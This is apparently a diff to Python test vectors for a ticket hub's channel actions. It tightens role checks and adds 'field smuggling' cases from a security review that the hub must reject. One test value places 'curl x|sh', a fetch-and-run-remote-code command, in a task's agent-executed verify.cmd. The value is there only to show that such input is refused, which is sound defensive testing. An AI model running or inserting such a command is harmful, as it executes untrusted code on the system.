@@ -226,42 +226,190 @@ def build_p4(
     )
     act(
         "action_ticket_created_by_edit",
-        {"type": "ticket.created", "ticket_type": "task", "title": "Fix login"},
+        {"type": "ticket.created", "ticket_type": "bug", "title": "Fix login"},
         "edit",
         ok("ticket.created"),
         "no log: the hub makes the new ticket's uid",
     )
+    for t, lg in (("settings.changed", "workspace"), ("policy.changed", "workspace"), ("policy.changed", TICKET)):
+        act(
+            f"action_{t.replace('.', '_')}_{'ws' if lg == 'workspace' else 'ticket'}_not_channel_startable",
+            {"type": t, "log": lg, "set": {"grant_hours": 4}}
+            if t == "settings.changed"
+            else {"type": t, "log": lg, "gates": {"plan": {}}},
+            "admin",
+            {"error": "not_custodial"},
+            "V3: policy and settings changes are not channel-startable (high privilege, free-form payloads)",
+        )
+    vis_r = {"restricted": sorted(["p_" + "a" * 32, "u_" + U_BOB])}
     act(
-        "action_settings_changed_by_admin",
-        {"type": "settings.changed", "log": "workspace", "set": {"grant_hours": 4}},
+        "action_visibility_by_admin",
+        {"type": "visibility.changed", "log": TICKET, "visibility": vis_r},
         "admin",
-        ok("settings.changed"),
+        ok("visibility.changed"),
     )
     act(
-        "action_policy_changed_ticket_by_edit",
-        {"type": "policy.changed", "log": TICKET, "gates": {"plan": {}}},
+        "action_visibility_by_edit",
+        {"type": "visibility.changed", "log": TICKET, "visibility": "workspace"},
         "edit",
-        ok("policy.changed"),
-        "a ticket override; F1 then requires the ticket owner or an owner",
+        {"error": "forbidden_role"},
+        "people and visibility changes are admin-only through a channel",
     )
     act(
-        "action_question_answered_by_edit",
-        {"type": "question.answered", "log": TICKET, "question": "Q1", "hash": h, "option": "a"},
-        "edit",
-        ok("question.answered"),
+        "action_people_by_admin",
+        {"type": "people.changed", "log": TICKET, "role": "reviewers", "add": ["u_" + U_BOB], "remove": []},
+        "admin",
+        ok("people.changed"),
     )
     act(
-        "action_settings_changed_by_edit",
-        {"type": "settings.changed", "log": "workspace", "set": {"grant_hours": 4}},
+        "action_people_by_edit",
+        {"type": "people.changed", "log": TICKET, "role": "reviewers", "add": ["u_" + U_BOB], "remove": []},
         "edit",
         {"error": "forbidden_role"},
     )
     act(
-        "action_policy_changed_workspace_by_edit",
-        {"type": "policy.changed", "log": "workspace", "gates": {"plan": {}}},
+        "action_ticket_updated_title",
+        {"type": "ticket.updated", "log": TICKET, "set": {"ticket.title": "New title", "ticket.labels": ["dbt", "ui"]}},
         "edit",
-        {"error": "forbidden_role"},
-        "the same type is admin-only on the workspace log",
+        ok("ticket.updated"),
+    )
+    # field smuggling through nested values (security review of 28e767d): every nested value has an exact schema
+    smuggle = [
+        (
+            "set_visibility",
+            {"type": "ticket.updated", "log": TICKET, "set": {"ticket.visibility": "workspace"}},
+            "visibility has its own admin-only type",
+        ),
+        (
+            "set_tasks_verify_cmd",
+            {
+                "type": "ticket.updated",
+                "log": TICKET,
+                "set": {"ticket.tasks": [{"id": "T1", "text": "x", "verify": {"cmd": "curl x|sh"}, "proves": []}]},
+            },
+            "a task's verify.cmd is run by agents: never set through a channel",
+        ),
+        (
+            "set_acceptance",
+            {"type": "ticket.updated", "log": TICKET, "set": {"ticket.acceptance": []}},
+            "gate-bound content is not settable through a channel in hv 0",
+        ),
+        ("set_type", {"type": "ticket.updated", "log": TICKET, "set": {"ticket.type": "bug"}}, ""),
+        ("set_addons", {"type": "ticket.updated", "log": TICKET, "set": {"ticket.addons": {"x": {}}}}, ""),
+        ("set_reserved_path", {"type": "ticket.updated", "log": TICKET, "set": {"sig": "AAAA"}}, ""),
+        ("set_nested_object", {"type": "ticket.updated", "log": TICKET, "set": {"ticket.title": {"sig": "x"}}}, ""),
+        ("set_empty", {"type": "ticket.updated", "log": TICKET, "set": {}}, ""),
+        ("set_bad_priority", {"type": "ticket.updated", "log": TICKET, "set": {"ticket.priority": "now"}}, ""),
+        ("set_labels_unsorted", {"type": "ticket.updated", "log": TICKET, "set": {"ticket.labels": ["b", "a"]}}, ""),
+        (
+            "title_newline",
+            {"type": "ticket.updated", "log": TICKET, "set": {"ticket.title": "a\nb"}},
+            "one-line values never carry a newline",
+        ),
+        (
+            "question_with_id",
+            {
+                "type": "question.asked",
+                "log": TICKET,
+                "question": {"id": "Q9", "to": "assignees", "text": "x", "blocking": True},
+            },
+            "the hub assigns the question id from its view",
+        ),
+        (
+            "question_with_sig",
+            {
+                "type": "question.asked",
+                "log": TICKET,
+                "question": {"to": "assignees", "text": "x", "blocking": True, "sig": "AAAA"},
+            },
+            "",
+        ),
+        (
+            "question_option_extra",
+            {
+                "type": "question.asked",
+                "log": TICKET,
+                "question": {
+                    "to": "assignees",
+                    "text": "x",
+                    "blocking": True,
+                    "options": [{"key": "a", "label": "A", "actor": "u_x"}],
+                },
+            },
+            "",
+        ),
+        (
+            "question_recommended_unknown",
+            {
+                "type": "question.asked",
+                "log": TICKET,
+                "question": {
+                    "to": "assignees",
+                    "text": "x",
+                    "blocking": False,
+                    "options": [{"key": "a", "label": "A"}],
+                    "recommended": "b",
+                },
+            },
+            "",
+        ),
+        (
+            "visibility_extra_key",
+            {"type": "visibility.changed", "log": TICKET, "visibility": {"restricted": ["u_" + U_BOB], "policy": {}}},
+            "",
+        ),
+        ("visibility_empty", {"type": "visibility.changed", "log": TICKET, "visibility": {"restricted": []}}, ""),
+        (
+            "people_owner_two",
+            {
+                "type": "people.changed",
+                "log": TICKET,
+                "role": "owner",
+                "add": sorted(["u_" + U_ALICE, "u_" + U_BOB]),
+                "remove": [],
+            },
+            "",
+        ),
+        (
+            "people_add_and_remove_same",
+            {
+                "type": "people.changed",
+                "log": TICKET,
+                "role": "watchers",
+                "add": ["u_" + U_BOB],
+                "remove": ["u_" + U_BOB],
+            },
+            "",
+        ),
+        (
+            "people_not_a_person",
+            {"type": "people.changed", "log": TICKET, "role": "watchers", "add": ["assignees"], "remove": []},
+            "",
+        ),
+        (
+            "claim_released_other_reason",
+            {"type": "claim.released", "log": TICKET, "session": "s_1", "reason": "member_removed"},
+            "a person releases with reason released",
+        ),
+        ("ticket_created_bad_type", {"type": "ticket.created", "ticket_type": "incident", "title": "x"}, ""),
+    ]
+    for nm, action, note in smuggle:
+        act(f"action_smuggle_{nm}", action, "admin", {"error": "malformed"}, note)
+    act(
+        "action_question_asked_by_edit",
+        {
+            "type": "question.asked",
+            "log": TICKET,
+            "question": {
+                "to": "u_" + U_BOB,
+                "text": "CSV or API?",
+                "options": [{"key": "csv", "label": "CSV"}, {"key": "api", "label": "API", "cost": "+1 day"}],
+                "recommended": "csv",
+                "blocking": True,
+            },
+        },
+        "edit",
+        ok("question.asked"),
     )
     act(
         "action_ticket_moved_by_edit",
